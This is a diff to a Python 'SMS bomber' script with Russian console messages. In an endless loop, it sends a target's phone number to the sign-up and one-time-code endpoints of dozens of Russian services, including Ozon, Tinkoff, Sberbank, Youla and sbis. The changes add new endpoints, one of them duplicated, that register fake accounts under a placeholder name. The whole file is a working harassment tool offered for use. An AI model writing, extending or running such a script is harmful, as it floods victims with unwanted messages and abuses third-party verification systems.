@@ -59,8 +59,12 @@ while True:
 		print( Fore . GREEN + '[+] Youla отправлено!')
 	except:
 		print(Fore . RED + '[-] Не отправлено!')
-    
 
+	try:
+		requests.post('https://newnext.ru/graphql', json={'operationName': 'registration', 'variables': {'client': {'firstName': 'Иван', 'lastName': 'Иванов', 'phone': _phone,'typeKeys': ['Unemployed']}},'query': 'mutation registration($client: ClientInput!) {''\n  registration(client: $client) {''\n    token\n    __typename\n  }\n}\n'})
+		print( Fore . GREEN + '[+] Newnext отправлено')
+	except:
+		print( Fore . RED + '[-] Newnext не отправлено')
 	try:
 		requests.post('https://www.ozon.ru/api/composer-api.bx/_action/fastEntry',json={"phone": _phone, "otpId": 0})
 		print( Fore . GREEN + '[+] Ozon отправлено!')
@@ -98,6 +102,12 @@ while True:
 		print(Fore . RED + '[-] Не отправлено!')
 
 	try:
+		requests.post('https://newnext.ru/graphql', json={'operationName': 'registration', 'variables': {'client': {'firstName': 'Иван', 'lastName': 'Иванов', 'phone': _phone,'typeKeys': ['Unemployed']}},'query': 'mutation registration($client: ClientInput!) {''\n  registration(client: $client) {''\n    token\n    __typename\n  }\n}\n'})
+		print( Fore . GREEN + '[+] Newnext отправлено')
+	except:
+		print( Fore . RED + '[-] Newnext не отправлено')
+
+	try:
 		requests.post('https://app.karusel.ru/api/v1/phone/', data={'phone': _phone}, headers={})
 		print( Fore . GREEN + '[+] Karusel отправлено!')
 		requests.post('https://api.tinkoff.ru/v1/sign_up', data={'phone': '+'+_phone}, headers={})
@@ -128,6 +138,12 @@ while True:
 		print( Fore . GREEN + '[+] Rabota отправлено!')
 	except:
 		print(Fore . RED + '[-] Не отправлено!')
+
+	try:
+		requests.post('https://online.sbis.ru/reg/service/', json={'jsonrpc':'2.0','protocol':'5','method':'Пользователь.ЗаявкаНаФизика','params':{'phone':_phone},'id':'1'})
+		print( Fore . GREEN + '[+] Online sbis отправлено')
+	except:
+		print( Fore . RED + '[-] Online sbis не отправлено ')
 
 	try:
 		requests.post('https://www.smsint.ru/bitrix/templates/sms_intel/include/ajaxRegistrationTrigger.php', data={'name': _name,'phone': _phone, 'promo': 'yellowforma'})
@@ -419,13 +435,6 @@ while True:
 		print( Fore . GREEN + '[+] Sberbank отправлено!')
 	except:
 		print( Fore . RED + '[-] Не отправлено!')
-
-try:
-		requests.post('https://moscow.rutaxi.ru/ajax_keycode.html', data={'l': _phone9}).json()["res"]
-		print(Fore . GREEN + '[+] RuTaxi отправлено!')
-	except:
-		print(Fore . RED + '[-] Не отправлено!')
-
 	try:
 		requests.post('https://youla.ru/web-api/auth/request_code', data={'phone': _phone})
 		print( Fore . GREEN + '[+] Youla отправлено!')
@@ -1055,6 +1064,8 @@ try:
 		print ( Fore . GREEN + '[+] Smsint отправлено!')
 	except:
 		print(Fore . RED + '[-] Не отправлено!')
+
+
 
 	try:
 		requests.get('https://www.oyorooms.com/api/pwa/generateotp?phone='+_phone9+'&country_code=%2B7&nod=4&locale=en')
